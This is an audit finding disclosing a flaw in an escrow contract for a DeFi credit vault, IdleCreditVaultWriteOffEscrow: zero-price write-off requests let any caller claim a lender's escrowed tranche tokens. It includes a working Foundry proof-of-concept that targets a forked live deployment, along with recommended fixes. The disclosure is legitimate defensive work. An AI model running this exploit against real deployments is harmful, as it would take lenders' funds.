### Title
Zero-value write-off requests allow a fulfiller to steal escrowed tranches - (File: `contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary

`createWriteOffRequest` validates that the escrowed tranche amount is nonzero, but accepts `underlyingsRequested == 0`; `fullfillWriteOffRequest` then accepts `_underlyings == 0` and transfers all escrowed tranche tokens to the fulfiller. [1](#0-0) [2](#0-1) 

### Finding Description

While an epoch is running, a lender calls `createWriteOffRequest(amount, 0)`, which escrows `amount` tranche tokens but records zero required underlying payment. [1](#0-0) 

Any caller can subsequently invoke `fullfillWriteOffRequest(lender, amount, 0)` because the fulfillment check only rejects an underlying payment below `currentRequest.underlyings`. [3](#0-2) 

The escrow then deletes the request, performs a zero-value underlying pull, pays a zero exit fee, transfers zero underlying to the lender, and sends the full escrowed tranche balance to the fulfiller. [4](#0-3) 

### Impact Explanation

A lender who accidentally creates or signs a transaction for a zero-price request can permanently lose the entire escrowed tranche position to any unprivileged fulfiller. [2](#0-1) 

The quantified loss is the full escrowed tranche amount and its corresponding redemption or secondary-market value, with zero underlying compensation paid to the lender. [5](#0-4) 

This breaks the exchange invariant that a fulfillment must pay the lender-specified consideration: when that consideration is recorded as zero, the contract treats a free confiscation as a valid fulfillment. [6](#0-5) [7](#0-6) 

### Likelihood Explanation

The attack is permissionless and requires no privileged call, borrower cooperation, timing race, or token transfer by the attacker beyond a zero-value `transferFrom`. [8](#0-7) 

Exploitation requires a lender to create a request with `underlyingsRequested` equal to zero, which can occur through an omitted destination amount, malformed integration input, or accidental transaction while an epoch is running. [1](#0-0) 

There is no slippage bound, minimum ask validation, confirmation step, or fulfiller authorization that prevents the zero-price request from being immediately consumed. [2](#0-1) 

### Recommendation

Reject zero-value asks in `createWriteOffRequest` with `if (underlyingsRequested == 0) revert Is0()`. [1](#0-0) 

Also require `_underlyings != 0` in `fullfillWriteOffRequest` as defense in depth for requests created before an upgrade. [3](#0-2) 

If zero-price transfers must remain supported intentionally, add an explicit separate cancellation or gifting flow rather than routing them through the purchase interface. [9](#0-8) 

### Proof of Concept

The following Foundry body demonstrates that a fulfiller receives the escrowed tranche without paying underlying, using `stdstore` only to place an existing deployment in the epoch-running phase required by `createWriteOffRequest`. [10](#0-9) 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/stdStorage.sol";
import "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import "../contracts/interfaces/IERC20Detailed.sol";

contract ZeroAskWriteOffPoC is Test {
    using stdStorage for StdStorage;

    IdleCreditVaultWriteOffEscrow escrow =
        IdleCreditVaultWriteOffEscrow(vm.envAddress("WRITE_OFF_ESCROW"));

    function testZeroAskRequestCanBeFulfilledForFree() public {
        address lender = makeAddr("lender");
        address fulfiller = makeAddr("fulfiller");
        uint256 trancheAmount = 100e18;

        address cdo = escrow.idleCDOEpoch();
        IERC20Detailed tranche = IERC20Detailed(escrow.tranche());
        IERC20Detailed underlying = IERC20Detailed(escrow.underlying());

        // The normal production precondition: requests can only be opened mid-epoch.
        stdstore.target(cdo).sig("isEpochRunning()").checked_write(true);
        assertTrue(IdleCDOEpochVariant(cdo).isEpochRunning());

        // Lender escrows tranche tokens but records a zero underlying ask.
        deal(address(tranche), lender, trancheAmount);
        vm.startPrank(lender);
        tranche.approve(address(escrow), trancheAmount);
        escrow.createWriteOffRequest(trancheAmount, 0);
        vm.stopPrank();

        (uint256 escrowedTranches, uint256 requestedUnderlying) =
            escrow.userRequests(lender);
        assertEq(escrowedTranches, trancheAmount);
        assertEq(requestedUnderlying, 0);

        uint256 lenderUnderlyingBefore = underlying.balanceOf(lender);

        // The fulfiller needs no underlying balance or approval because the
        // contract performs a zero-value transferFrom and then releases tranches.
        vm.prank(fulfiller);
        escrow.fullfillWriteOffRequest(lender, trancheAmount, 0);

        assertEq(tranche.balanceOf(fulfiller), trancheAmount);
        assertEq(tranche.balanceOf(lender), 0);
        assertEq(underlying.balanceOf(lender), lenderUnderlyingBefore);

        (escrowedTranches, requestedUnderlying) = escrow.userRequests(lender);
        assertEq(escrowedTranches, 0);
        assertEq(requestedUnderlying, 0);
    }
}
```

Run the PoC against a deployment by exporting `WRITE_OFF_ESCROW` and executing `forge test --fork-url "$RPC_URL" --match-test testZeroAskRequestCanBeFulfilledForFree -vvv`. [11](#0-10)

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  /// @notice delete the write-off request and transfer tranche tokens back to the user
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
  }
```

```text
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
